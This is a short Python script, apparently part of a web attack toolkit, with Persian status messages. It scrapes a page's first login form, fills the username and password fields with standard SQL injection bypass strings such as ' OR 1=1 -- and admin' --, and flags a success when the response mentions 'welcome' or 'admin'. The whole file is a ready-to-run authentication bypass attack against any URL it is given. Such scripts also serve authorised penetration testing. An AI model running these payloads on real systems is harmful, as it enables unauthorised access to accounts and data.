# payloads/sqli.py

import requests
from bs4 import BeautifulSoup

def test_sqli(url, method, input_names):
    print("[sqli] شروع تست فرم با payloadهای پیشرفته")
    try:
        session = requests.Session()
        res = session.get(url)
        soup = BeautifulSoup(res.text, "html.parser")
        forms = soup.find_all("form")

        if not forms:
            print("[!] فرم به‌درستی دریافت نشده.")
            return

        form = forms[0]
        action = form.get("action") or url
        form_url = requests.compat.urljoin(url, action)
        inputs = form.find_all("input")

        sqli_payloads = [
            "admin' --",
            "admin' /*",
            "admin';--",
            "admin'||'1'='1",
            "' OR 1=1 --",
            "' OR 'a'='a",
            "' OR '1'='1' /*"
        ]

        for payload in sqli_payloads:
            data = {}
            for inp in inputs:
                name = inp.get("name")
                if not name:
                    continue
                if "user" in name.lower():
                    data[name] = payload
                elif "pass" in name.lower():
                    data[name] = payload
                else:
                    data[name] = inp.get("value") or "test"

            try:
                if method == "post":
                    response = session.post(form_url, data=data)
                else:
                    response = session.get(form_url, params=data)

                if "welcome" in response.text.lower() or "admin" in response.text.lower():
                    print(f"    ✅ SQLi موفق روی payload: {payload}")
                else:
                    print(f"    ❌ تست ناموفق برای payload: {payload}")

            except Exception as e:
                print(f"    ⚠️ خطا در ارسال payload: {payload} → {e}")

    except Exception as e:
        print(f"[sqli] خطا: {e}")

def test_sqli_direct(url):
    print("[sqli] اجرای دستی تست SQLi روی URL مشخص‌شده.")
    test_sqli(url, "post", ["username", "password"])
